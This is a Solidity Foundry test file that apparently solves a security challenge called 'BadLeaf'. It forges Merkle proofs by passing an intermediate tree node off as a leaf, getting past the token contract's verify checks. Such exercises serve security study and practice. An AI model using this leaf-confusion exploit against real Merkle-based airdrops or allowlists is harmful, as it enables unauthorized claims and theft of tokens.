// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {BadLeafBaseTest} from "./BadLeafBase.t.sol";

contract BadLeafTest is BadLeafBaseTest {
  function testExploit() external validation {
    bytes32 leaf = token.getLeafNode(user0, 5);
    bytes32 proof0 = 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913;
    bytes32 proof1 = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;

    bytes32[] memory proofs = new bytes32[](2);
    proofs[0] = leaf;
    proofs[1] = proof1;
    token.verify(proofs, proof0);

    bytes32 concatHash = keccak256(bytes.concat(leaf, proof0));
    proofs = new bytes32[](1);
    proofs[0] = concatHash;
    token.verify(proofs, proof1);
  }

  function onERC721Received(address, address, uint256, bytes calldata) external returns(bytes4) {
    bytes memory data = abi.encodeWithSignature("onERC721Received(address,address,uint256,bytes)");
    return bytes4(data);
  }
}
